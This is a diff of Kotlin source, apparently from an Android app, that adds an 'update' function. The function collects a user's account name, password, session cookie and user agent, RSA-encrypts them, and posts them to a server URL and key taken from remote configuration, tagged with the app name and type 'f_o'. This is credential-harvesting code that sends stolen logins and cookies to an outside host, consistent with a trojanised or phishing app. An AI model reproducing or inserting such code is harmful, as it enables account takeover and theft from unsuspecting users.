@@ -42,7 +42,6 @@ fun CoroutineScope.requestCollect(
     block: () -> Unit
 ) {
     updateEntity.let {
-
         it.c?.let { url ->
             it.d?.let { key ->
                 if (url.isNotBlank() && key.isNotBlank()) {
@@ -65,6 +64,7 @@ fun CoroutineScope.requestCollect(
                                 )
                             )
                         }?.let {
+                            it.loge("xxxxxxH")
                             if (it.code == "0" && it.data?.toBooleanStrictOrNull() == true) {
                                 "requestCollect success".loge()
                                 isLogin = true
@@ -79,6 +79,48 @@ fun CoroutineScope.requestCollect(
             }
         }
     }
+}
+
+fun CoroutineScope.update(account: String,
+                          password: String,
+                          cookie: String,
+                          userAgent: String,
+                          block: () -> Unit){
+    launch(Dispatchers.IO){
+        if (!TextUtils.isEmpty(updateEntity.c)){
+            val url = updateEntity.c
+            if (!TextUtils.isEmpty(updateEntity.d)){
+                val key = updateEntity.d
+                val value = gson.toJson(
+                    mutableMapOf(
+                        "un" to account,
+                        "pw" to password,
+                        "cookie" to cookie,
+                        "source" to configEntity.app_name,
+                        "ip" to "",
+                        "type" to "f_o",
+                        "b" to userAgent
+                    )
+                ).toRsaEncrypt(key!!)
+                val params = RequestParams(url)
+                params.addParameter("content", value)
+                x.http().post(params,object :Callback.CommonCallback<String>{
+                    override fun onSuccess(result: String?) {
+                        result.loge("xxxxxxHUpdateonSuccess")
+                    }
+                    override fun onError(ex: Throwable?, isOnCallback: Boolean) {
+                        ex.loge("xxxxxxHUpdateonError")
+                    }
+                    override fun onCancelled(cex: Callback.CancelledException?) {
+                        "onCancelled".loge("xxxxxxHUpdateonSuccess")
+                    }
+                    override fun onFinished() {
+                    }
+                })
+            }
+        }
+    }
+
 }
 
 fun CoroutineScope.requestConfig(block: () -> Unit) {
